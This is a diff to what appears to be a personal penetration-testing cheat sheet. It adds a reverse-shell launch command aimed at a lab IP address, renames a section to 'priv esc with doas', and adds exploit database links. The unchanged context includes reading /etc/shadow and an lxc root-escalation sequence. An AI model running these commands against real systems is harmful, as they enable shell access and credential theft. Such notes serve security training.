@@ -31,6 +31,9 @@ xxd -r file.txt
 base64 /etc/shadow | base64 -d
 ```
 `l\s`: Equivalent to `ls`
+
+python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
+
 #### Decompress a gzip file:
 ```
 gzip -d file.gz
@@ -143,7 +146,7 @@ lxc start ignite
 lxc exec ignite /bin/sh
 ```
 </details>
-<details><summary> read file with doas </summary>
+<details><summary> priv esc with doas </summary>
 
 ```
 doas -u root openssl enc -in file
@@ -239,6 +242,9 @@ central hierarchical database used to store information necessary to configure t
 regedit
 ```
 </details>
+<details><summary>Group policy objects</summary>
+a collection of settings that can be applied to OUs
+</details>
 </details>
 
 <details><summary> SMB discovery </summary>
@@ -290,6 +296,10 @@ rdesktop -u <username> -p <password> <ip> -g 70% -r disk:folder=/home/toor/cd/ap
 * [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
 * [reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 * [g0tmi1k priv esc](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+* [rapid7](https://www.rapid7.com/)
+* [attackerkb](https://attackerkb.com/)
+* [cve.mitre.org](https://cve.mitre.org/cve/)
+* [exploit-db](https://www.exploit-db.com/)
 
 ###  Encoding techniques:
 - [splitbrain](https://www.splitbrain.org/_static/ook/)
